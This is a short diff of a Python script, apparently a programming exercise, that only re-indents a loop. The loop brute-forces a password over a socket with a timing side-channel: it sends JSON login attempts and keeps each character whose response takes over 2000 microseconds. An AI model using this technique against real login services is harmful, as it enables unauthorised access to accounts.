@@ -24,18 +24,19 @@ with socket.socket() as client_socket:
                         break
                 break
         guessing_password = True
-        while guessing_password:
-            for pw_character in itertools.product(symbols, repeat=1):
-                pw_character = ''.join(pw_character)
-                json_input = json.dumps({"login": new_login, "password": base_pw + pw_character}, indent=4)
-                start = datetime.now()
-                client_socket.send(json_input.encode())
-                response = json.loads(client_socket.recv(1024).decode())
-                finish = datetime.now()
-                time_difference = finish - start
-                if time_difference.microseconds > 2000:
-                    base_pw += pw_character
-                elif response["result"] == 'Connection success!':
-                    guessing_password = False
-                    break
+    while guessing_password:
+        for pw_character in itertools.product(symbols, repeat=1):
+            pw_character = ''.join(pw_character)
+            json_input = json.dumps({"login": new_login, "password": base_pw + pw_character}, indent=4)
+            start = datetime.now()
+            client_socket.send(json_input.encode())
+            response = json.loads(client_socket.recv(1024).decode())
+            finish = datetime.now()
+            time_difference = finish - start
+            if time_difference.microseconds > 2000:
+                base_pw += pw_character
+            elif response["result"] == 'Connection success!':
+                guessing_password = False
+                break
     print(json_input)
+    
